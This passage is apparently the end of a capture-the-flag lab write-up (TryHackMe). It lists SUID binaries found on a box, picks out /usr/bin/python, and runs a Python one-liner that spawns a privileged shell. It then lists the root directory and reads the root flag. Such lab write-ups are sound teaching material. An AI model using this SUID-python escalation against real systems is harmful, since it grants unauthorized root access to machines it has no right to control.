2&gt;/dev/null\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/snapd/snap-confine\n/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/bin/traceroute6.iputils\n/usr/bin/newuidmap\n/usr/bin/newgidmap\n/usr/bin/chsh\n/usr/bin/python\n/usr/bin/at\n/usr/bin/chfn\n/usr/bin/gpasswd\n/usr/bin/sudo\n/usr/bin/newgrp\n/usr/bin/passwd\n/usr/bin/pkexec\n/snap/core/8268/bin/mount\n/snap/core/8268/bin/ping\n/snap/core/8268/bin/ping6\n/snap/core/8268/bin/su\n/snap/core/8268/bin/umount\n/snap/core/8268/usr/bin/chfn\n/snap/core/8268/usr/bin/chsh\n/snap/core/8268/usr/bin/gpasswd\n/snap/core/8268/usr/bin/newgrp\n/snap/core/8268/usr/bin/passwd\n/snap/core/8268/usr/bin/sudo\n/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core/8268/usr/lib/openssh/ssh-keysign\n/snap/core/8268/usr/lib/snapd/snap-confine\n/snap/core/8268/usr/sbin/pppd\n/snap/core/9665/bin/mount\n/snap/core/9665/bin/ping\n/snap/core/9665/bin/ping6\n/snap/core/9665/bin/su\n/snap/core/9665/bin/umount\n/snap/core/9665/usr/bin/chfn\n/snap/core/9665/usr/bin/chsh\n/snap/core/9665/usr/bin/gpasswd\n/snap/core/9665/usr/bin/newgrp\n/snap/core/9665/usr/bin/passwd\n/snap/core/9665/usr/bin/sudo\n/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core/9665/usr/lib/openssh/ssh-keysign\n/snap/core/9665/usr/lib/snapd/snap-confine\n/snap/core/9665/usr/sbin/pppd\n/bin/mount\n/bin/su\n/bin/fusermount\n/bin/ping\n… who turns out to be privileged\nA:\n/usr/bin/python\nQ: Find a form to escalate your privileges.\nNo answer needed\nbash-4.4$ python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'\npython -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'\n# whoami\nwhoami\nroot\n# pwd\npwd\n/\n# ls -lh\nls -lh\ntotal 2.1G\ndrwxr-xr-x   2 root root 4.0K Aug  4  2020 bin\ndrwxr-xr-x   3 root root 4.0K Aug  4  2020 boot\ndrwxr-xr-x   2 root root 4.0K Aug  4  2020 cdrom\ndrwxr-xr-x  15 root root 3.7K May 28 15:11 dev\ndrwxr-xr-x  96 root root 4.0K Aug  4  2020 etc\ndrwxr-xr-x   4 root root 4.0K Aug  4  2020 home\nlrwxrwxrwx   1 root root   34 Aug  4  2020 initrd.img -&gt; boot/initrd.img-4.15.0-112-generic\nlrwxrwxrwx   1 root root   34 Aug  4  2020 initrd.img.old -&gt; boot/initrd.img-4.15.0-112-generic\ndrwxr-xr-x  22 root root 4.0K Aug  4  2020 lib\ndrwxr-xr-x   2 root root 4.0K Aug  4  2020 lib64\ndrwx------   2 root root  16K Aug  4  2020 lost+found\ndrwxr-xr-x   2 root root 4.0K Feb  3  2020 media\ndrwxr-xr-x   2 root root 4.0K Feb  3  2020 mnt\ndrwxr-xr-x   2 root root 4.0K Feb  3  2020 opt\ndr-xr-xr-x 112 root root    0 May 28 15:11 proc\ndrwx------   6 root root 4.0K Aug  4  2020 root\ndrwxr-xr-x  26 root root  860 May 28 15:13 run\ndrwxr-xr-x   2 root root  12K Aug  4  2020 sbin\ndrwxr-xr-x   4 root root 4.0K Aug  4  2020 snap\ndrwxr-xr-x   2 root root 4.0K Feb  3  2020 srv\n-rw-------   1 root root 2.0G Aug  4  2020 swap.img\ndr-xr-xr-x  13 root root    0 May 28 15:11 sys\ndrwxrwxrwt   2 root root 4.0K May 28 16:03 tmp\ndrwxr-xr-x  10 root root 4.0K Feb  3  2020 usr\ndrwxr-xr-x  14 root root 4.0K Aug  4  2020 var\nlrwxrwxrwx   1 root root   31 Aug  4  2020 vmlinuz -&gt; boot/vmlinuz-4.15.0-112-generic\nlrwxrwxrwx   1 root root   31 Aug  4  2020 vmlinuz.old -&gt; boot/vmlinuz-4.15.0-112-generic\n# cat /root/root.txt                        \ncat /root/root.txt\nQ: root.txt\nA:\nTHM{pr1v1l3g3_3sc4l4t10n}"
  }
]